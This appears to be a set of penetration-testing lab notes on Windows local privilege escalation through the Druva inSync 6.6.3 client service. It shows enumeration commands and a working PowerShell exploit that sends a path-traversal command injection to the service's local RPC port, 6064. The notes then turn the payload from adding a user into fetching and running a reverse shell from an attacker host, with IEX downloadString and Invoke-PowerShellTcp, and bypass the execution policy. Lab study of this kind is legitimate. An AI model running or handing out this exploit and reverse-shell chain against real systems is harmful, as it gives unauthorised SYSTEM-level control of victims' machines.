# Vulnerable Services

## Vulnerable Services

which we target third party App running with system privilege

### **Enumerating Installed Programs**

```powershell
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
**Druva inSync 6.6.3**
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

we found all programs are windows program expect **`Druva inSync`** after search we found this by version vulnerable to command injection by RPC service

### **Enumerating Local Ports**

Let's do some further enumeration to confirm that the service is running as expected. A quick look with `netstat` shows a service running locally on port `6064`.

```powershell
C:\htb> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

### **Enumerating Process ID**

Next, let's map the process ID (PID) `3324` back to the running process.

```powershell
PS C:\htb> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

### **Enumerating Running Service**

At this point, we have enough information to determine that the Druva inSync application is indeed installed and running, but we can do one last check using the `Get-Service` cmdlet.

```powershell
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

## **Druva inSync Windows Client Local Privilege Escalation Example**

### **Druva inSync PowerShell PoC**

this powershell code which exploit bug by open session on port 6064 and send command injection to service

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"  # this is the command will be execute

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

#### **Modifying PowerShell PoC**

For our purposes, we want to modify the `$cmd` variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems wherever possible) or sending ourselves a reverse shell. Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script to our attack box, and rename it something simple like `shell.ps1`. **Open the file,** and append the following at the bottom of the script file **(changing the IP to match our address and listening port as well):**

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Modify the `$cmd` variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

### **Catching a SYSTEM Shell**

```powershell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
```

***
